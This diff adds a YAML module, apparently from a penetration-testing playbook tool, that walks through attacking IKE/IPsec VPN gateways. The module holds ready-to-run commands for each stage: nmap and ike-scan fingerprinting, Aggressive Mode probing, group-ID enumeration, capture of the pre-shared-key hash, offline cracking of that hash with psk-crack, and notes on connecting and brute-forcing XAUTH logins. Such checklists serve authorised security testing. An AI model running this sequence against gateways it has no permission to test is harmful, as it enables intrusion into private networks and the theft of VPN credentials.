@@ -1,0 +1,66 @@
+module: ike
+name: IKE / IPsec VPN (500 UDP)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / fingerprint VPN gateway
+        commands: |
+          nmap -sU -p$PORT -sV $IP
+          nmap -sU -p$PORT --script=ike-version $IP
+      - id: scan
+        text: Probe IKE (main mode) and fingerprint vendor
+        commands: |
+          ike-scan $IP
+          ike-scan -M $IP
+
+  - id: enum
+    name: Aggressive Mode & Transforms
+    steps:
+      - id: aggressive
+        text: Check for Aggressive Mode (leaks PSK hash)
+        commands: |
+          ike-scan -A $IP
+          ike-scan -A -M $IP
+      - id: groupid
+        text: Aggressive mode with a group/ID name (VPN group enum)
+        commands: |
+          ike-scan -A -n <groupid> $IP
+      - id: transforms
+        text: Enumerate accepted transform sets
+        manual: true
+        commands: |
+          # ike-scan --trans=... to brute enc/hash/auth/group combos
+
+  - id: creds
+    name: PSK Capture & Cracking
+    authorized: true
+    steps:
+      - id: capture_psk
+        text: Capture the Aggressive-Mode PSK hash
+        commands: |
+          ike-scan -A -P$OUT/psk.txt $IP
+      - id: crack_psk
+        text: Crack the captured PSK
+        commands: |
+          psk-crack -d $PASSLIST $OUT/psk.txt
+          psk-crack -b 5 $OUT/psk.txt
+
+  - id: exploit
+    name: Post-Access
+    steps:
+      - id: connect
+        text: Connect once PSK + group are known
+        manual: true
+        commands: |
+          # configure strongSwan/ipsec or the vendor client with group + PSK,
+          # then handle XAUTH ($USER/$PASS) if required
+      - id: xauth
+        text: XAUTH credential surface (second factor after PSK)
+        manual: true
+        commands: |
+          # some gateways allow XAUTH user brute once the group PSK is valid
